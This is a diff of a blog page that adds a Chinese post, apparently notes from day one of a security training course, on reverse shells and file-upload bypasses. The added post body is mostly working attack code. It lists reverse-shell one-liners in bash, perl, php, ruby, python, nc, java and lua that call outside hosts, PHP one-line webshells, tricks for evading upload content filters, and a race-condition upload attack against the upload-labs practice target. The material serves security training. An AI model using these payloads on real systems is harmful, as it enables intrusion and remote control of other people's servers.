@@ -79,7 +79,7 @@
 
 
 
-  <meta name="keywords" content="gaoteng, gaoteng17, opencv, caffe, python">
+  <meta name="keywords" content="网络安全,">
 
 
 
@@ -90,13 +90,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="gaoteng&#39;s blog">
-<meta property="og:url" content="http://got17.cn/tags/DNS/index.html">
+<meta name="description" content="第一天讲文件上传里的一些绕过方法和反弹shell。">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全4x01】洞明科技网络安全培训 --- day1">
+<meta property="og:url" content="http://got17.cn/1093/index.html">
 <meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="第一天讲文件上传里的一些绕过方法和反弹shell。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-08-20T13:12:28.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="gaoteng&#39;s blog">
+<meta name="twitter:title" content="【网络安全4x01】洞明科技网络安全培训 --- day1">
+<meta name="twitter:description" content="第一天讲文件上传里的一些绕过方法和反弹shell。">
 
 
 
@@ -126,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://got17.cn/tags/DNS/">
+  <link rel="canonical" href="http://got17.cn/1093/">
 
 
 
 
 
-  <title>标签: DNS | gaoteng's blog</title>
+  <title>【网络安全4x01】洞明科技网络安全培训 --- day1 | gaoteng's blog</title>
   
 
 
@@ -151,7 +156,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -277,52 +282,204 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>DNS<small>标签</small>
-        </h2>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1093/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gaoteng17">
+      <meta itemprop="description" content="About Life, Work and Code.">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/1025/" itemprop="url">
-              
-                <span itemprop="name">【信息网络学习day10 H3C设备配置DNS】</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">【网络安全4x01】洞明科技网络安全培训 --- day1</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-03T10:49:26+08:00" content="2019-08-03">
-          08-03
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-20T21:35:08+08:00">
+                2020-08-20
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    </div>
+      
 
+      
+        <p>第一天讲文件上传里的一些绕过方法和反弹shell。</p>
+<a id="more"></a>
+
+<h1 id="Linux下NC反弹shell命令"><a href="#Linux下NC反弹shell命令" class="headerlink" title="Linux下NC反弹shell命令"></a>Linux下NC反弹shell命令</h1><p>本机开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line">nc -vvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机器开启反弹</p>
+<p>bash版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>perl版本：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+
+<p>php版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<p>ruby版本：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+
+<p>python版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+
+<p>nc版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>
+
+<p>java版本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<p>lua版本：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
+
+<p>NC版本不使用-e参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h2 id="php内容过滤"><a href="#php内容过滤" class="headerlink" title="php内容过滤"></a>php内容过滤</h2><ul>
+<li><p>绕过<code>&lt;? ?&gt;</code>：使用<code>&lt;script language=php&gt; &lt;/script&gt;</code></p>
+</li>
+<li><p>绕过<code>eval</code>、<code>assert</code>过滤：使用<code>system();</code></p>
+</li>
+<li><p>绕过<code>GET</code>、<code>post</code>过滤：使用<code>REQUEST</code></p>
+</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script language=php&gt;system($_REQUEST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>url/xxx.php?cmd=</code>或者post一个<code>cmd=</code>的包均可，也可以写一个一句话木马到别的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/xxx.php?cmd=<span class="keyword">echo</span> <span class="string">'&lt;?php @eval($_POST[sb]);?&gt;'</span> &gt;&gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接反弹shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.234 4445 &gt;/tmp/f'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果同级路径下有后缀不为php的一句话木马，也可以一句话包含执行：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="keyword">include</span>(<span class="string">'ma.txt'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>upload-labs Less17</p>
+<p>上传<code>123.php</code>，内容为生成下面的反弹shell，burp里intruder开500线程重复攻击，浏览器不断刷新访问还未被删除的<code>123.php</code>，直至反弹shell创建成功：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'gt.php'</span>, <span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"><i class="fa fa-tag"></i> 网络安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/1092/" rel="next" title="【git加速clone项目+切换远程https/ssh方式】">
+                <i class="fa fa-chevron-left"></i> 【git加速clone项目+切换远程https/ssh方式】
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -330,6 +487,11 @@
 
 
           
+    
+    <div id="gitalk-container">
+    </div>
+  
+
         </div>
         
           
@@ -349,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -425,6 +596,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下NC反弹shell命令"><span class="nav-number">1.</span> <span class="nav-text">Linux下NC反弹shell命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传"><span class="nav-number">2.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解析漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php内容过滤"><span class="nav-number">2.2.</span> <span class="nav-text">php内容过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件竞争"><span class="nav-number">2.3.</span> <span class="nav-text">条件竞争</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -540,6 +727,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
 
   
 
